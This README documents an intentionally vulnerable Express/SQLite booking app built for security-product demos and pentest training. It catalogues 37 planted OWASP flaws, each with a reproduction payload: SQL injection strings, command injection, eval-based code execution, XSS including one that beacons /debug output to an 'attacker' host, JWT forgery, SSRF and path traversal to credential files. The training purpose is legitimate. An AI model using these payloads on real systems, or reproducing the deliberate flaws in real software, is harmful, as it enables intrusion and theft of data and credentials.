# PadelGol — Intentionally Vulnerable Demo

A paddle / football court booking site built on Express + SQLite, **deliberately seeded with vulnerabilities** for use in cybersecurity product demos (SAST / DAST / pentest training).

> ⚠️ **DO NOT DEPLOY PUBLICLY.** Run only on `localhost` or an isolated lab network. The app stores plaintext passwords, leaks secrets, accepts shell injection, etc.

## Run

```bash
npm install
npm start
# → http://localhost:3000
```

The first run auto-seeds `padelgol.db` with users, courts, bookings and reviews.

## Demo accounts

| Username | Password    | Role  |
|----------|-------------|-------|
| admin    | admin123    | admin |
| alice    | password1   | user  |
| bob      | qwerty      | user  |
| carlos   | letmein     | user  |
| vip_user | vip2025     | vip   |

## Catalogue of planted vulnerabilities

Mapped to OWASP Top 10 (2021). Every entry includes a reproduction recipe so your scanner / reviewer can demo the find.

### A01 — Broken Access Control
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 1 | **IDOR — read any booking** | `GET /booking/:id` in [server.js](server.js) | Login as `alice`, visit `/booking/4` (vip_user's booking). |
| 2 | **IDOR — cancel any booking** | `POST /booking/:id/cancel` | As `alice`, `curl -X POST http://localhost:3000/booking/4/cancel --cookie "..."`. |
| 3 | **Missing role check on `/admin`** | `GET /admin` | Login as `alice`, browse `/admin` directly. |
| 4 | **Read anyone's messages** | `GET /messages?user=admin` | Login as any user, change `?user=` to peek. |
| 5 | **Mass-assignment elevates role** | `POST /register` and `POST /profile` | Send `role=admin` in the form/body. |

### A02 — Cryptographic Failures
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 6 | **Plaintext passwords in DB** | `users.password` column | `sqlite3 padelgol.db "SELECT username,password FROM users"`. |
| 7 | **Hardcoded JWT secret & API key** | top of `server.js` and `.env` | `GET /debug` reveals both. |
| 8 | **Cookies missing httpOnly/Secure/SameSite** | `app.use(session(...))`, raw `uid/uname/role` cookies | Inspect DevTools → Application. |

### A03 — Injection
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 9 | **SQLi — login bypass** | `POST /login` | username: `admin' --`  password: anything. |
| 10 | **SQLi — search** | `GET /search?q=` | `?q=' UNION SELECT 1,username,password,email,role,description,image FROM users--`. |
| 11 | **SQLi — court detail** | `GET /courts/:id` | `/courts/1 OR 1=1`. |
| 12 | **SQLi — sport filter** | `GET /courts?sport=` | `?sport=paddle' OR '1'='1`. |
| 13 | **SQLi — messages** | `GET /messages?user=` | `?user=' OR '1'='1`. |
| 14 | **OS command injection** | `GET /admin/ping?host=` | `?host=127.0.0.1;id` or `?host=$(id)`. |
| 15 | **`eval()` RCE** | `GET /admin/calc?expr=` | `?expr=require('child_process').execSync('id').toString()`. |

### A03 — XSS
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 16 | **Reflected XSS** | `GET /search?q=` rendered via `<%- q %>` | `?q=<script>alert(1)</script>`. |
| 17 | **Stored XSS — reviews** | `POST /courts/:id/review` | Post a review containing `<img src=x onerror=alert(1)>`. |
| 18 | **Stored XSS — booking notes** | `POST /book/:courtId` | Book with `notes=<script>fetch('/debug').then(r=>r.text()).then(t=>navigator.sendBeacon('//attacker',t))</script>` and view `/my-bookings`. |
| 19 | **Stored XSS — profile bio** | `POST /profile` (bio field) rendered raw | Save `<svg onload=alert(document.cookie)>` as bio. |

### A04 — Insecure Design
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 20 | **Password reset by guessable security answer** | `/forgot` | Guess `pet name = fluffy` to reset admin. Errors confirm valid usernames (enumeration). |
| 21 | **No rate limiting** anywhere | `POST /login` etc. | Run hydra / sqlmap freely. |
| 22 | **No CSRF tokens** | every mutating route | Cross-origin form post will succeed (also `SameSite=none` is set). |

### A05 — Security Misconfiguration
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 23 | **Verbose stack traces** | global error handler + `/login` SQL error | Send malformed SQL via login. |
| 24 | **`/debug` endpoint leaks env, secrets, cookies, session** | `GET /debug` | Browse `/debug`. |
| 25 | **Permissive CORS with credentials** | header middleware | `fetch('http://localhost:3000/api/whoami', {credentials:'include'})` from any origin. |
| 26 | **Missing security headers** | none set | No CSP, HSTS, X-Frame-Options, X-Content-Type-Options. |
| 27 | **`.env` checked into source tree** | `/.env` | Combined with path traversal: `/download?file=.env`. |

### A06 — Vulnerable Components / Outdated Patterns
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 28 | **Prototype-pollution sink** | `POST /profile` `Object.assign({}, req.body)` | Send `__proto__[role]=admin` (depending on parser). |

### A07 — Identification & Authentication Failures
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 29 | **JWT `alg:none` accepted** | `GET /api/whoami` | Forge header `{"alg":"none","typ":"JWT"}` + payload `{"role":"admin"}`, send via cookie `token=`. |
| 30 | **Identity in plain cookie** | `currentUser()` falls back to `uid`/`role` cookies | Set `Cookie: uid=1; role=admin` → instant admin. |

### A08 — Software & Data Integrity Failures
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 31 | **Unrestricted file upload** | `POST /profile/avatar` | Upload `pwn.html` containing `<script>` → served at `/uploads/pwn.html`, same origin. |
| 32 | **No content-type / extension whitelist** | `multer` config | Upload `.svg` with embedded `<script>`. |

### A09 — Logging & Monitoring
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 33 | **No security logging**, attacker actions invisible | (absence) | — |
| 34 | **Path traversal in log viewer** | `GET /admin/logs?file=` | `?file=../padelgol.db` or `?file=../.env`. |

### A10 — Server-Side Request Forgery
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 35 | **SSRF via admin fetch** | `GET /admin/fetch?url=` | `?url=http://169.254.169.254/latest/meta-data/` (cloud metadata) or `?url=file:///etc/passwd` style. |
| 36 | **Open redirect** | `GET /redirect?url=`, `POST /login` `next=` | `/redirect?url=http://evil.example`. |
| 37 | **Path traversal download** | `GET /download?file=` | `/download?file=../../etc/passwd`. |

## File map

```
server.js          # Express app, all routes (vulnerabilities annotated with VULN: comments)
db.js              # SQLite schema + seed
views/             # EJS templates — note <%- %> raw renders for XSS surfaces
public/            # Static CSS/SVG assets
uploads/           # Avatar upload sink (served as static)
logs/access.log    # Read by /admin/logs (path traversal target)
.env               # Plaintext secrets (also reachable via /debug)
README.md          # This catalogue
```

## License & intent

For internal demo/training use only. Do not redistribute outside your security-product evaluation context.
